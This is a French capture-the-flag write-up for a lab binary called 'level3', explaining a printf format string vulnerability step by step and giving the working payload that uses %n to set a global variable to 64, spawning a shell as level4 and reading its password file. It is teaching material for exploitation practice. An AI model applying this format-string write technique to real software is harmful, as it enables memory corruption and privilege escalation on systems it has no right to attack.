# level3

## Objectif

Exploiter le binaire `level3` pour obtenir un shell `level4` et lire
`/home/user/level4/.pass`.

## 1. Repérer la faille

```sh
gdb ./level3
(gdb) disas main
```

```asm
0x0804851a <+0>:   push   %ebp
0x0804851b <+1>:   mov    %esp,%ebp
0x0804851d <+3>:   and    $0xfffffff0,%esp
0x08048520 <+6>:   call   0x80484a4 <v>      ; toute la logique est dans v
0x08048525 <+11>:  leave
0x08048526 <+12>:  ret
```

`main` appelle `v`. On regarde `v` :

```asm
0x080484a7 <+3>:   sub    $0x218,%esp             ; frame de 0x218 = 536 octets
0x080484ad <+9>:   mov    0x8049860,%eax          ; stdin
0x080484b6 <+18>:  movl   $0x200,0x4(%esp)        ; taille = 0x200 = 512
0x080484be <+26>:  lea    -0x208(%ebp),%eax       ; buffer à ebp-0x208
0x080484c7 <+35>:  call   0x80483a0 <fgets@plt>   ; fgets(buffer, 512, stdin)
0x080484cc <+40>:  lea    -0x208(%ebp),%eax
0x080484d5 <+49>:  call   0x8048390 <printf@plt>  ; printf(buffer)  <-- faille
```

Deux choses importantes :

- C'est **`fgets`** (borné à 512 octets), pas `gets` → **pas de débordement**
  possible cette fois. La technique des niveaux précédents ne s'applique pas.
- `printf` est appelé avec **notre saisie comme *format*** : `printf(buffer)` au
  lieu de `printf("%s", buffer)`. C'est une **faille de chaîne de format**
  (*format string*). `printf` interprète les `%` de notre entrée, et deux formats nous intéresse pour l'exploitation : `%x` qui **lit** un
  mot sur la pile et `%n` qui **écrit** en mémoire.

### Rappel : comment `printf` fonctionne

**a. `printf` en fonctionnement normal**

Quand tu écris :

```c
printf("j'ai %d ans et je m'appelle %s", 25, "toto");
```

`printf` reçoit deux choses :
- le **format** : `"j'ai %d ans et je m'appelle %s"` (le 1ᵉʳ argument) ;
- des **arguments supplémentaires** : `25` et `"toto"`.

`printf` lit le format **caractère par caractère** :
- un caractère normal (`j`, `'`, `a`…) → il l'affiche tel quel ;
- un `%` → il lit le spécificateur qui suit (`%d`, `%s`, `%x`…) et va chercher
  **l'argument suivant** pour l'afficher dans ce format.

Donc `%d` = « prends le prochain argument et affiche-le en décimal », `%x` =
« … en hexadécimal », `%s` = « … comme une chaîne », etc.

**b. 🔑 Le détail qui change tout : d'où viennent les arguments ?**

Voici le point crucial. `printf` **ne sait pas** combien d'arguments on lui a
réellement passés. Il fait **aveuglément confiance au format** : chaque `%` du
format le pousse à aller chercher « l'argument suivant ».

Et où va-t-il les chercher ? En 32 bits, les arguments d'une fonction sont posés
**sur la pile**, juste après le format. Donc `printf` fonctionne comme ça :

```
1er %  -> lit le mot de pile juste après le format
2e  %  -> lit le mot de pile suivant
3e  %  -> le suivant
...
```

Il **avance sur la pile**, un mot (4 octets) à la fois, à chaque `%`. Il ne
vérifie jamais si ces mots correspondent à de vrais arguments que tu as fournis.
**Il lit ce qui est là.**

## 2. La condition à remplir

```asm
0x080484da <+54>:  mov    0x804988c,%eax          ; eax = m (variable globale)
0x080484df <+59>:  cmp    $0x40,%eax               ; m == 0x40 (= 64) ?
0x080484e2 <+62>:  jne    0x8048518 <v+116>        ; non -> fin, rien
...
0x0804850c <+104>: movl   $0x804860d,(%esp)        ; "/bin/sh"
0x08048513 <+111>: call   0x80483c0 <system@plt>   ; system("/bin/sh")
```

Il existe une variable **globale `m`** (adresse `0x804988c`). **Si `m` vaut
exactement 64**, le programme lance `system("/bin/sh")`. Rien dans le code ne
modifie `m` (elle reste à 0) : c'est à nous de la forcer à 64, en exploitant la
faille de format string.

## 3. L'outil de l'exploitation : `%n`

C'est le spécificateur `%n` qui va nous permettre d'exploiter `printf`. À la
différence de `%x` ou `%d` qui **lisent** un argument pour l'afficher, `%n` **lis** un argument, le traite comme une adresse (`int *`), et
**y écrit le nombre de caractères que `printf` a affichés jusqu'ici**.

```c
int count;
printf("abcde%n", &count);   // count reçoit 5 : "abcde" = 5 caractères affichés
```

`printf` ne décide pas *où* écrire : il écrit simplement à **l'adresse contenue
dans le slot d'argument** de ce `%n`, quelle qu'elle soit. C'est exactement ce
qu'on va détourner.

Donc, pour écrire nous-mêmes **64 dans `m`** via le compteur d'un `%n`, il faut
réunir **deux conditions** :

1. **l'adresse de `m` (`0x804988c`) doit être passée dans le slot d'argument que
   le `%n` consomme** — sinon `printf` écrira le compteur ailleurs ;
2. **au moment où `printf` atteint le `%n`, le compteur doit valoir exactement
   64** — c'est cette valeur qui sera écrite dans `m`.

Les deux sections suivantes règlent chacune une de ces conditions : d'abord
**trouver à quel slot d'argument correspond notre saisie** (pour y glisser
l'adresse de `m`), puis **construire le format qui affiche exactement 64
caractères** avant le `%n`.

## 4. Trouver la position de notre saisie sur la pile

Pour satisfaire la **1ʳᵉ condition** (l'adresse de `m` dans le slot du `%n`), il
faut d'abord savoir à quel numéro d'argument correspond le début de notre saisie.
On sonde la pile avec des `%x` :

```sh
python -c 'print "AAAA" + ".%x"*10' | ./level3
```

```
AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e...
       (1)   (2)      (3)     (4)
```

`printf` avance sur la pile d'un mot à chaque `%` ; comme le buffer est
lui-même sur la pile, `printf` finit par lire son propre contenu. Le `41414141`
(= `AAAA`) apparaît au **4ᵉ `%x`** → le début de notre saisie est le **4ᵉ
argument** vu par `printf`. C'est là qu'on placera l'adresse de `m`.

## 5. Construire le payload

On veut **écrire 64 dans `m` (`0x804988c`)** avec `%n`. `%n` écrit le **nombre de
caractères déjà affichés** à l'adresse fournie en argument.

Structure : `[adresse de m][%60x][%4$n]`

- `\x8c\x98\x04\x08` → l'adresse de `m` (little-endian) ; **4 caractères
  affichés**, et c'est l'argument n°4.
- `%60x` → affiche 60 caractères paddés.
- `%4$n` → n écrit le compteur (`4 + 60 = 64`) à l'adresse en 4e position 4$ = `m`.

Déroulement de `printf` sur le format `\x8c\x98\x04\x08%60x%n`, avec son
compteur de caractères affichés :

## 6. Exécuter et récupérer le flag

```sh
(printf '\x8c\x98\x04\x08%%60x%%4$n'; cat) | ./level3
```

Quand `m` vaut 64, le `cmp $0x40` réussit → `system("/bin/sh")`. Le `; cat`
maintient l'entrée ouverte pour interagir avec le shell.

```sh
whoami                          # level4
cat /home/user/level4/.pass
```

Le mot de passe récupéré est à reporter dans le fichier `flag`.

## Nature de la faille

Faille de chaîne de format : `printf(buffer)` utilise une entrée contrôlée par
l'utilisateur comme format. Via `%n`, on écrit une valeur choisie (64) à une
adresse choisie (la globale `m`), ce qui satisfait la condition `m == 0x40` et
déclenche le `system("/bin/sh")` déjà présent dans le binaire.
